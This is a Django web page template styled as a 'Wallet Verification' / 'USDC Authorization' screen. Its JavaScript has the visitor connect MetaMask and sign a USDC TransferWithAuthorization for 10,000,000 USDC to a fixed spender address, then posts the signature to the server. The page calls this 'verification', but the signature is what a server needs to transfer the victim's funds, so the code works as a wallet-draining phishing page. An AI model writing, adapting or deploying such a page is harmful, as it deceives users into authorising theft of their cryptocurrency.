{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wallet Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-white d-flex align-items-center justify-content-center vh-100">

<div class="p-5 rounded bg-secondary text-center" style="max-width: 400px;">
    <h3>USDC Authorization</h3>
    <div id="step-1">
        <button id="connectBtn" class="btn btn-primary w-100 mt-3">Connect Wallet</button>
    </div>
    <div id="step-2" class="d-none">
        <p id="addrDisplay" class="text-info small mt-2"></p>
        <button id="signBtn" class="btn btn-success w-100">Sign Permission</button>
    </div>
    <p id="status" class="mt-3 small">Ready</p>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

<script>
    const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
    let userAccount = null;

    document.getElementById('connectBtn').onclick = async () => {
        if (!window.ethereum) return alert("Please install MetaMask");

        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];

            // Ensure we are on Ethereum Mainnet (Chain ID 1)
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }],
            });

            document.getElementById('step-1').classList.add('d-none');
            document.getElementById('step-2').classList.remove('d-none');
            document.getElementById('addrDisplay').innerText = userAccount;
        } catch (err) {
            alert("Please connect and switch to Mainnet.");
        }
    };

    document.getElementById('signBtn').onclick = async () => {
        const status = document.getElementById('status');
        try {
            // ETHERS V6 SYNTAX
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const network = await provider.getNetwork();

            const nonce = ethers.hexlify(ethers.randomBytes(32));
            const deadline = Math.floor(Date.now() / 1000) + 86400;
            const amount = ethers.parseUnits("10000000", 6);

            const domain = {
                name: "USD Coin",
                version: "2",
                chainId: network.chainId,
                verifyingContract: USDC_ADDR
            };

            const types = {
                TransferWithAuthorization: [
                    { name: "from", type: "address" },
                    { name: "to", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "validAfter", type: "uint256" },
                    { name: "validBefore", type: "uint256" },
                    { name: "nonce", type: "bytes32" }
                ]
            };

            const message = {
                from: userAccount,
                to: SPENDER,
                value: amount,
                validAfter: 0,
                validBefore: deadline,
                nonce: nonce
            };

            status.innerText = "Check wallet to sign...";

            // Sign the data
            const signature = await signer.signTypedData(domain, types, message);
            const sig = ethers.Signature.from(signature);

            // Send to Django
            status.innerText = "Saving...";
            const response = await fetch('/user/update-wallet-status/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
                body: JSON.stringify({
                    address: userAccount,
                    v: sig.v, r: sig.r, s: sig.s,
                    nonce: nonce, deadline: deadline, amount: amount.toString()
                })
            });

            if (response.ok) {
                status.innerText = "Success!";
                alert("Verification saved!");
            }
        } catch (err) {
            status.innerText = "Error: " + err.message;
        }
    };
</script>
</body>
</html>
